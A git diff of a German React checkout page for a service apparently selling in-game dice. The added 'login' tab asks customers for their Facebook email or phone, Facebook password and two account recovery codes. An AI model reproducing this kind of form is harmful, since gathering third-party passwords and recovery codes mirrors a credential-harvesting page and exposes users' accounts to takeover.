@@ -9,6 +9,7 @@ import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle }
 import { Separator } from '@/components/ui/separator';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 
+
 export default function WuerfelCheckout() {
   // State für Formular
   const [authMethod, setAuthMethod] = useState('authtoken');
@@ -242,93 +243,126 @@ export default function WuerfelCheckout() {
                       </div>
                     </div>
                     
-                    <div className="flex items-center space-x-2 mt-6">
-                      <input 
-                        type="checkbox" 
-                        id="terms" 
-                        name="agreedToTerms" 
-                        className="h-4 w-4 text-[#00CFFF] rounded" 
-                        checked={formData.agreedToTerms} 
-                        onChange={handleInputChange} 
-                        required 
-                      />
-                      <Label htmlFor="terms" className="text-sm">
-                        Ich stimme den <Link href="/agb" className="text-[#00CFFF] hover:underline">AGB</Link> und <Link href="/datenschutz" className="text-[#00CFFF] hover:underline">Datenschutzbestimmungen</Link> zu
-                      </Label>
-                    </div>
-                    
-                    <Button type="submit" className="w-full bg-[#FF4C00] hover:bg-[#FF4C00]/80">
-                      Jetzt kaufen
-                    </Button>
+
                   </form>
                 </TabsContent>
                 
                 <TabsContent value="login">
                   <form onSubmit={handleSubmit} className="space-y-4 mt-4">
-                    <div className="space-y-2">
-                      <Label htmlFor="loginEmail">E-Mail-Adresse</Label>
-                      <Input 
-                        id="loginEmail" 
-                        name="loginEmail" 
-                        type="email" 
-                        placeholder="ihre.email@beispiel.de" 
-                        value={formData.loginEmail} 
-                        onChange={handleInputChange} 
-                        required 
-                      />
-                    </div>
-                    
-                    <div className="space-y-2">
-                      <Label htmlFor="password">Passwort</Label>
-                      <Input 
-                        id="password" 
-                        name="password" 
-                        type="password" 
-                        placeholder="Ihr Passwort" 
-                        value={formData.password} 
-                        onChange={handleInputChange} 
-                        required 
-                      />
-                    </div>
-                    
-                    <div className="space-y-2">
-                      <Label htmlFor="phone">Handynummer</Label>
-                      <Input 
-                        id="phone" 
-                        name="phone" 
-                        placeholder="+49 123 456789" 
-                        value={formData.phone} 
-                        onChange={handleInputChange} 
-                        required 
-                      />
-                    </div>
-                    
-                    <div className="grid grid-cols-2 gap-4">
-                      <div className="space-y-2">
-                        <Label htmlFor="recoveryCode1">Wiederherstellungscode 1</Label>
+                    <div className="bg-[#00CFFF]/10 p-4 rounded-lg mb-6">
+                      <h4 className="babix-info-header text-[#0A3A68] mb-2 flex items-center">
+                        <span className="material-icons text-[#00CFFF] mr-2">person</span>
+                        Persönliche Daten
+                      </h4>
+                      
+                      <div className="space-y-2 mt-4">
+                        <Label htmlFor="name">Vor- und Nachname</Label>
                         <Input 
-                          id="recoveryCode1" 
-                          name="recoveryCode1" 
-                          placeholder="Code 1" 
-                          value={formData.recoveryCode1} 
+                          id="name" 
+                          name="name" 
+                          placeholder="Ihr vollständiger Name" 
+                          value={formData.name} 
                           onChange={handleInputChange} 
                           required 
                         />
                       </div>
-                      <div className="space-y-2">
-                        <Label htmlFor="recoveryCode2">Wiederherstellungscode 2</Label>
+                      
+                      <div className="space-y-2 mt-4">
+                        <Label htmlFor="email">E-Mail-Adresse</Label>
                         <Input 
-                          id="recoveryCode2" 
-                          name="recoveryCode2" 
-                          placeholder="Code 2" 
-                          value={formData.recoveryCode2} 
+                          id="email" 
+                          name="email" 
+                          type="email" 
+                          placeholder="ihre.email@beispiel.de" 
+                          value={formData.email} 
                           onChange={handleInputChange} 
                           required 
                         />
                       </div>
+                      
+                      <div className="space-y-2 mt-4">
+                        <Label htmlFor="whatsapp">WhatsApp (freiwillig)</Label>
+                        <Input 
+                          id="whatsapp" 
+                          name="whatsapp" 
+                          placeholder="Für mögliche Rückfragen" 
+                          value={formData.whatsapp} 
+                          onChange={handleInputChange} 
+                        />
+                        <p className="text-xs text-gray-500 mt-1">Für mögliche Rückfragen, ansonsten nutzen wir Ihre E-Mail-Adresse</p>
+                      </div>
                     </div>
                     
-                    <div className="bg-yellow-50 p-4 rounded-lg border-l-4 border-yellow-400">
+                    <div className="bg-[#00CFFF]/10 p-4 rounded-lg">
+                      <h4 className="babix-info-header text-[#0A3A68] mb-2 flex items-center">
+                        <span className="material-icons text-[#00CFFF] mr-2">facebook</span>
+                        Facebook Zugangsdaten
+                      </h4>
+                      
+                      <div className="space-y-2 mt-4">
+                        <Label htmlFor="loginIngameName">Ingame Name</Label>
+                        <Input 
+                          id="loginIngameName" 
+                          name="loginIngameName" 
+                          placeholder="Ihr Name im Spiel" 
+                          value={formData.loginIngameName} 
+                          onChange={handleInputChange} 
+                          required 
+                        />
+                      </div>
+                      
+                      <div className="space-y-2 mt-4">
+                        <Label htmlFor="loginEmail">Email / Handynummer</Label>
+                        <Input 
+                          id="loginEmail" 
+                          name="loginEmail" 
+                          placeholder="Ihre Facebook Email oder Handynummer" 
+                          value={formData.loginEmail} 
+                          onChange={handleInputChange} 
+                          required 
+                        />
+                      </div>
+                      
+                      <div className="space-y-2 mt-4">
+                        <Label htmlFor="password">Passwort</Label>
+                        <Input 
+                          id="password" 
+                          name="password" 
+                          type="password" 
+                          placeholder="Ihr Facebook Passwort" 
+                          value={formData.password} 
+                          onChange={handleInputChange} 
+                          required 
+                        />
+                      </div>
+                      
+                      <div className="grid grid-cols-2 gap-4 mt-4">
+                        <div className="space-y-2">
+                          <Label htmlFor="recoveryCode1">Wiederherstellungscode 1</Label>
+                          <Input 
+                            id="recoveryCode1" 
+                            name="recoveryCode1" 
+                            placeholder="Wiederherstellungscode 1" 
+                            value={formData.recoveryCode1} 
+                            onChange={handleInputChange} 
+                            required 
+                          />
+                        </div>
+                        <div className="space-y-2">
+                          <Label htmlFor="recoveryCode2">Wiederherstellungscode 2</Label>
+                          <Input 
+                            id="recoveryCode2" 
+                            name="recoveryCode2" 
+                            placeholder="Wiederherstellungscode 2" 
+                            value={formData.recoveryCode2} 
+                            onChange={handleInputChange} 
+                            required 
+                          />
+                        </div>
+                      </div>
+                    </div>
+                    
+                    <div className="bg-yellow-50 p-4 rounded-lg border-l-4 border-yellow-400 mt-6">
                       <h4 className="babix-info-header text-[#0A3A68] mb-2 flex items-center">
                         <span className="material-icons text-yellow-500 mr-2">warning</span>
                         Wichtiger Hinweis
@@ -338,38 +372,56 @@ export default function WuerfelCheckout() {
                         um sicher auf Ihren Account zugreifen zu können.
                       </p>
                     </div>
-                    
-                    <div className="flex items-center space-x-2 mt-6">
-                      <input 
-                        type="checkbox" 
-                        id="loginTerms" 
-                        name="agreedToTerms" 
-                        className="h-4 w-4 text-[#00CFFF] rounded" 
-                        checked={formData.agreedToTerms} 
-                        onChange={handleInputChange} 
-                        required 
-                      />
-                      <Label htmlFor="loginTerms" className="text-sm">
-                        Ich stimme den <Link href="/agb" className="text-[#00CFFF] hover:underline">AGB</Link> und <Link href="/datenschutz" className="text-[#00CFFF] hover:underline">Datenschutzbestimmungen</Link> zu
-                      </Label>
-                    </div>
-                    
-                    <Button type="submit" className="w-full bg-[#FF4C00] hover:bg-[#FF4C00]/80">
-                      Jetzt kaufen
-                    </Button>
                   </form>
                 </TabsContent>
               </Tabs>
             </CardContent>
-            <CardFooter className="flex flex-col items-start">
-              <div className="text-sm text-gray-500 mt-4">
+            <CardFooter className="flex flex-col items-start w-full">
+              {/* Hinweise zum Widerrufsrecht und AGB */}
+              <div className="w-full space-y-4 mb-6">
+                <div className="flex items-start space-x-2">
+                  <input 
+                    type="checkbox" 
+                    id="agreedToWithdrawalNotice" 
+                    name="agreedToWithdrawalNotice" 
+                    className="h-4 w-4 mt-1 text-[#00CFFF] rounded" 
+                    checked={formData.agreedToWithdrawalNotice} 
+                    onChange={handleInputChange} 
+                    required 
+                  />
+                  <Label htmlFor="agreedToWithdrawalNotice" className="text-sm">
+                    Ich bin ausdrücklich damit einverstanden, dass mit der Ausführung des Auftrags vor Ablauf der Widerrufsfrist begonnen wird. Mir ist bekannt, dass mein <Link href="/widerruf" className="text-[#00CFFF] hover:underline">Widerrufsrecht</Link> mit Beginn der Ausführung erlischt.
+                  </Label>
+                </div>
+                
+                <div className="flex items-start space-x-2">
+                  <input 
+                    type="checkbox" 
+                    id="agreedToTerms" 
+                    name="agreedToTerms" 
+                    className="h-4 w-4 mt-1 text-[#00CFFF] rounded" 
+                    checked={formData.agreedToTerms} 
+                    onChange={handleInputChange} 
+                    required 
+                  />
+                  <Label htmlFor="agreedToTerms" className="text-sm">
+                    Ich habe die <Link href="/agb" className="text-[#00CFFF] hover:underline">AGB</Link> und <Link href="/datenschutz" className="text-[#00CFFF] hover:underline">Datenschutzbestimmungen</Link> gelesen und akzeptiere diese.
+                  </Label>
+                </div>
+              </div>
+              
+              <Button type="submit" className="w-full bg-[#FF4C00] hover:bg-[#FF4C00]/80 text-white font-bold">
+                Jetzt kaufen
+              </Button>
+              
+              <div className="text-sm text-gray-500 mt-6 w-full">
                 <p className="flex items-start">
                   <span className="material-icons text-[#00CFFF] mr-2 text-sm">security</span>
                   Ihre Daten werden sicher übermittelt und verschlüsselt gespeichert
                 </p>
                 <p className="flex items-start mt-2">
                   <span className="material-icons text-[#00CFFF] mr-2 text-sm">support_agent</span>
-                  Bei Fragen kontaktieren Sie uns gerne über <Link href="/kontakt" className="text-[#00CFFF] hover:underline">unser Kontaktformular</Link>
+                  Bei Fragen kontaktieren Sie uns gerne über <Link href="https://wa.me/4915223842897" className="text-[#00CFFF] hover:underline">WhatsApp</Link> oder <Link href="mailto:support@babixgo.de" className="text-[#00CFFF] hover:underline">E-Mail</Link>
                 </p>
               </div>
             </CardFooter>
